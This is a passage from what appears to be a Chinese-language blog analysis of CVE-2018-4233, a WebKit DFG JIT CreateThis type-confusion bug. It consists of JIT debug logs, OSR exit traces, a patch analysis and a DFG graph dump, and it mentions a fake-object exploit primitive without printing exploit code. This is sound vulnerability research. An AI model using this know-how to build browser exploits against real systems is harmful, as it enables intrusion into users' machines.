0x372925000780):</span><br></pre></td></tr></table></figure><h4 id="4-1-第一次OSRExit"><a href="#4-1-第一次OSRExit" class="headerlink" title="4.1 第一次OSRExit"></a>4.1 第一次OSRExit</h4><p>随后产生了Firing watchpoint，并丢弃get的dfg代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f398 on get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Jettisoning get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60] and counting reoptimization due to UnprofiledWatchpoint, Executed op_put_scope&lt;LocalClosureVar&gt;.</span></span><br></pre></td></tr></table></figure><p>栈回溯可见，它的产生是由于JIT::operationPutToScope，显然这个栈回溯来自代理中get handler中的赋值<code>arr[0] = {};</code>。</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102135609869-6408569.png" alt="image-20190102135609869"></p><p>之后是相应的JumpReplacement：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Firing jump replacement watchpoint from 0x3729250003ee, to 0x37252900067f.</span><br><span class="line">    Did invalidate get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">    Did count reoptimization <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">    Did install baseline version of get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Generated JIT code <span class="keyword">for</span> Baseline put_by_val stub <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd784c0-&gt;0x11cd98fd0, BaselineFunctionCall, 60 (FTLFail)], return point 0x3728e500268c:</span></span><br><span class="line">    Code at [0x372925000240, 0x3729250002c0):</span><br></pre></td></tr></table></figure><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102140009081-6408809.png" alt="image-20190102140009081"></p><p>Jump replacement位于DFG JIT code for get，大概位置是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SetArgument</span><br><span class="line">SetArgument</span><br><span class="line">CheckStructure</span><br><span class="line">SetArgument</span><br><span class="line">MovHint</span><br><span class="line">JSConstant</span><br><span class="line">...</span><br><span class="line">InvalidationPoint</span><br><span class="line">[GetLocal]           -&gt; jump from here</span><br><span class="line">CheckStringIdent</span><br><span class="line">GetButterfly</span><br><span class="line">GetByOffset</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="4-2-第二次OSRExit"><a href="#4-2-第二次OSRExit" class="headerlink" title="4.2 第二次OSRExit"></a>4.2 第二次OSRExit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f438 on get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Jettisoning get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].</span></span><br></pre></td></tr></table></figure><p>此次的栈回溯为：</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102140537841-6409137.png" alt="image-20190102140537841"></p><p>其中的重点是：</p><p>JSC::JSObject::convertDooubleToContiguousWhilePerformingSetIndex<br>JIT::operationPutByVal<br><strong>0x3728e500268c baseline JIT code for get# [put_by_val]</strong><br>JSC::ProxyObject::getOwnPropertySlot<br>JSC::JSObject::get 回调发生处<br><strong>dfg::operationCreateThis(0x100d53cd0)</strong><br><strong>0x372925000c05 DFG JIT code for assign#</strong><br>JIT::operationLinkCall<br><strong>0x3728e50038d3 Baseline JIT code for primitiveFakeObj# [construct]</strong></p><p>随后有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f208 on assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">Jettisoning assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].</span></span><br><span class="line"></span><br><span class="line">Firing jump replacement watchpoint from 0x3729250008dc, to 0x372925000d45.</span><br><span class="line">    Did invalidate assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">    Did count reoptimization <span class="keyword">for</span> assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">    Did install baseline version of assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br></pre></td></tr></table></figure><p>DFG jump 位于DFG JIT for assign：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">CheckTraps</span><br><span class="line">InvalidationPoint</span><br><span class="line">[GetLocal]           -&gt; jump from here</span><br><span class="line">CreateThis</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>从打印数据里看CreateThis的执行调用operationCreateThis，然后从JSC::JSObject::get中回调触发assign赋值(ConvertDoubleToContiguous)，然后触发Jump replacement，但显然Jump replacement的跳出点位于CreateThis之前，而CreateThis之后不再有跳出点。意即：虽然作出了OSRExit的动作，但并没有成功OSRExit，这里就是bug的直观表现了。</p><h3 id="五、补丁分析"><a href="#五、补丁分析" class="headerlink" title="五、补丁分析"></a>五、补丁分析</h3><p>针对这个漏洞，补丁围绕对CreateThis字节码进行建模修改了两处内容clobberize、AbstractInterpreter。下面分别考察这两部分的作用。在这个过程中，可以多次修改代码、编译运行程序、dump内存、放入反汇编器，便于阅读JIT代码提高效率。</p><p>用于dump内存的lldb命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">me <span class="built_in">read</span> -o /Users/dwfault/Downloads/dump.bin -b 0x31fe33000500 0x31fe33001000 --force</span><br></pre></td></tr></table></figure><h4 id="5-1-考察clobberize"><a href="#5-1-考察clobberize" class="headerlink" title="5.1 考察clobberize"></a>5.1 考察clobberize</h4><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102143448324-6410888.png" alt="image-20190102143448324"></p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102143946262-6411186.png" alt="image-20190102143946262"></p><p>右图的字节码对应write(Heap)补丁之后的代码。可以看到IR中的CreateThis后面增加了一个InvalidationPoint，其他都没有改变。但由于此处相应会产生一个Jump replacement(参考DFGInvalidationPointInjectionPhase)，导致CreateThis回调结束之后会被Jump replacement引到OSRExit，使漏洞不再触发。</p><h4 id="5-2-考察AbstractInterperter"><a href="#5-2-考察AbstractInterperter" class="headerlink" title="5.2 考察AbstractInterperter"></a>5.2 考察AbstractInterperter</h4><p>按照同样的方法，现在为CreateThis只加上clobberWorld。</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102144836735-6411716.png" alt="image-20190102144836735"></p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102144930667-6411770.png" alt="image-20190102144930667"></p><p>可以看到在GetButterfly之前增加了一个CheckStrucure，其x86机器码是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword [rax], 0x5b</span><br></pre></td></tr></table></figure><p>细致调试可以知道，arr变量的structureID之前是0x5b，现在成了0x5c，这也使得执行流程走向了OSRExit，使漏洞不再发生。</p><h4 id="5-3-深究clobberize与AbstractInterpreter"><a href="#5-3-深究clobberize与AbstractInterpreter" class="headerlink" title="5.3 深究clobberize与AbstractInterpreter"></a>5.3 深究clobberize与AbstractInterpreter</h4><p>可以看到在5.1、5.2两节中，clobberize、AbstractInterpretrer两处对IR建模的描述直接导致了JIT编译器产生了不同的代码。其中5.1节clobber与InvalidationPoint的关系非常明确，在DFGInvalidationPointInjectPhase中可以很明确地知道：</p><p>(1) DFGClobberize把Abstract Heap以树型结构分为几类：</p><ul><li>World<ul><li>Stack</li><li>Heap<ul><li>Other(Top)<ul><li>Other(none Top)</li><li>Watchpoint_fire<ul><li>SideState</li></ul></li></ul></li></ul></li></ul></li></ul><p>(2) writesOverlap函数检查目标opcode结点的write属性与WatchPoint_fire在树型结构中的父子关系，如果WatchPoint_fire在目标opcode结点的子树上，则插入InvalidationPoint。</p><p>而对于AbstractInterpreter，clobberWorld的作用不明显，需要加以更多调试。 回到漏洞版本，增加运行选项运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dumpDFGGraphAtEachPhase=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>得到的输出节选如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">Beginning DFG phase structure check hoisting.</span><br><span class="line">Before structure check hoisting:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: BeforeFixpoint; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched, CurrentlyCFAUnreachable</span><br><span class="line">Vars Before: &lt;empty&gt;</span><br><span class="line">Intersected Vars Before: arg2:(DoubleImpureNan|Top|Empty, TOP, TOP) arg1:(DoubleImpureNan|Top|Empty, TOP, TOP) arg0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc1:(DoubleImpureNan|Top|Empty, TOP, TOP) loc2:(DoubleImpureNan|Top|Empty, TOP, TOP) loc3:(DoubleImpureNan|Top|Empty, TOP, TOP) loc4:(DoubleImpureNan|Top|Empty, TOP, TOP) loc5:(DoubleImpureNan|Top|Empty, TOP, TOP) loc6:(DoubleImpureNan|Top|Empty, TOP, TOP) loc7:(DoubleImpureNan|Top|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Check:Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Check:Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Check:Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Check:Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Check:Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Check:Untyped:@26, IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|UseAsOther, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#15, ExitValid) predicting Array</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Check:Untyped:@29, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Check:Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Check:Cell:@29, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Check:Cell:@29, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(Check:KnownCell:@29, Check:Int32:@31, Check:DoubleRepReal:@40&lt;Double&gt;, Check:Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Check:Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Flush(Check:Untyped:@28, MustGen|IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), R:Stack(5), W:SideState, bc<span class="comment">#22, ExitValid) predicting Final</span></span><br><span class="line"></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched</span><br><span class="line">Vars After: &lt;empty&gt;</span><br><span class="line">Var Links: arg2:@32 arg1:@29 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br><span class="line"></span><br><span class="line">Beginning DFG phase strength reduction.</span><br><span class="line">Before strength reduction:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched, CurrentlyCFAUnreachable</span><br><span class="line">Vars Before: &lt;empty&gt;</span><br><span class="line">Intersected Vars Before: arg2:(DoubleImpureNan|Top|Empty, TOP, TOP) arg1:(DoubleImpureNan|Top|Empty, TOP, TOP) arg0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc1:(DoubleImpureNan|Top|Empty, TOP, TOP) loc2:(DoubleImpureNan|Top|Empty, TOP, TOP) loc3:(DoubleImpureNan|Top|Empty, TOP, TOP) loc4:(DoubleImpureNan|Top|Empty, TOP, TOP) loc5:(DoubleImpureNan|Top|Empty, TOP, TOP) loc6:(DoubleImpureNan|Top|Empty, TOP, TOP) loc7:(DoubleImpureNan|Top|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Check:Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, 